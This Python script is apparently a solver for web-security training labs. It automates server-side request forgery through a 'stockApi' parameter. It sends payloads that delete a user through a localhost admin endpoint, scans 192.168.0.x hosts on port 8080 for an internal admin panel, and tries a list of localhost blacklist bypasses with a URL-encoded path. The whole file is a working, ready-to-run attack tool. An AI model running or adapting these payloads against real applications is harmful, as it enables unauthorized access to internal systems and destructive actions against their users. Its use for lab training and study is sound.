import requests
from tabulate import tabulate
from urllib.parse import urlparse
from urllib.parse import quote

class textcolor:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    DANGER = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class SSRFVulnerability:

    def __init__(self, base_url):
        self.base_url = base_url

    def http_request(self, url):
        payload = {'stockApi': url}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(payload))}

        try:
            response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers, timeout=3)
            return response

        except requests.exceptions.ConnectTimeout as e:
            return 1
        except requests.exceptions.RequestException as e:
            print("\n"+textcolor.DANGER+"Error occurred: "+textcolor.ENDC)
            print(f"{str(e)}\n")
        except Exception as e:
            print(f"\n"+textcolor.DANGER+"Unexpected error occurred:"+textcolor.ENDC)
            print(f"{str(e)}\n")

        return 0

    def local_system(self):
        
        payloadURL = 'http://localhost/admin/delete?username=carlos'
        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
        return 1 if self.http_request(payloadURL).content else 0

    def internal_system(self):
        try:
            for i in range(1, 256):

                ip = '192.168.0.'+str(i)
                response = self.http_request('http://'+ip+':8080'+'/admin')

                print(textcolor.OKCYAN+" [*] Checking "+str(ip)+": "+str(response.status_code)+" HTTP status"+textcolor.ENDC,end="\r")

                if response and response.status_code == 200:
                    print(textcolor.OKGREEN+"\n\n"+ip+": 200 HTTP status"+textcolor.ENDC)
                    payloadURL = 'http://'+ip+':8080'+'/admin/delete?username=carlos'
                    print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
                    return 1 if self.http_request(payloadURL) else 0    
        except:
            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
            return 0
        
    def blacklist_filter(self):
        # bypasses for localhost domain
        bypasses = ['localhost','127.0.0.1', '127.1', '::1', '0:0:0:0:0:0:0:1', '::ffff:127.0.0.1', '127%2e0%2e0%2e1', '127%2e1']
        try:
            for i in bypasses:
                response = self.http_request('http://'+i)
                print(textcolor.OKCYAN+" [*] trying to bypass using "+str(i)+": "+str(response.status_code)+" HTTP status           "+textcolor.ENDC,end="\r")
                if response.status_code == 200:
                    print(textcolor.OKGREEN+"\n\n["+i+"] 200 HTTP status"+textcolor.ENDC)
                    # url encode twice to bypass the defense
                    payloadURL = 'http://'+i+'/%61dmin/delete?username=carlos'
                    print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
                    response = self.http_request(payloadURL)
                    return 1 if response.content else 0
        except:
            print(textcolor.DANGER+"\nError occured"+textcolor.ENDC)
            return 0

def encode(string):
    return "".join("%{0:0>2x}".format(ord(char)) for char in string)

def validate_url(url):
    parsed_url = urlparse(url)
    if parsed_url.scheme and parsed_url.netloc:
        return True
    return False

def handle_choice(number, instance):

    if number == 1:
        if instance.local_system():
            print(textcolor.OKGREEN+"Local Server: Username Deleted Successfully\n"+textcolor.ENDC)

    elif number == 2:  
        if instance.internal_system():
            print(textcolor.OKGREEN+"Remote Server: Username Deleted Successfully\n"+textcolor.ENDC)

    elif number == 3:
        if instance.blacklist_filter():
            print(textcolor.OKGREEN+"Blacklist Bypass: Username Deleted Successfully\n"+textcolor.ENDC)
    else:
        print(textcolor.DANGER+"\nInvalid choice."+textcolor.ENDC)

def main():

    try:
        url = input("\n"+textcolor.WARNING+"Enter the URL to perform SSRF: "+textcolor.ENDC)
    except:
        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)
        return

    # Validate the URL
    if not validate_url(url):
        print(textcolor.DANGER+"Invalid URL: Check properly\n"+textcolor.ENDC)
        return

    data = [
        [textcolor.OKBLUE+"(1)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against the local server"+textcolor.ENDC],
        [textcolor.OKBLUE+"(2)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against another back-end system"+textcolor.ENDC],
        [textcolor.OKBLUE+"(3)"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with blacklist-based input filter"+textcolor.ENDC]
    ]

    headers = [textcolor.OKGREEN+"Labs"+textcolor.ENDC,textcolor.OKGREEN+"Title"+textcolor.ENDC]

    # Generate the table
    table = tabulate(data, headers, tablefmt="pretty")

    # Print the table
    print("\n"+table)

    try:
        choice = input("\n"+textcolor.WARNING+"Enter your Lab (1-7): "+textcolor.ENDC)
        #choice = 2
    except:
        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)
        return

    # Create an instance of SSRFVulnerability with the base URL of the shopping application
    instanceVar = SSRFVulnerability(url)

    try:
        handle_choice(int(choice), instanceVar)
    except:
        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)

if __name__ == '__main__':
    main()
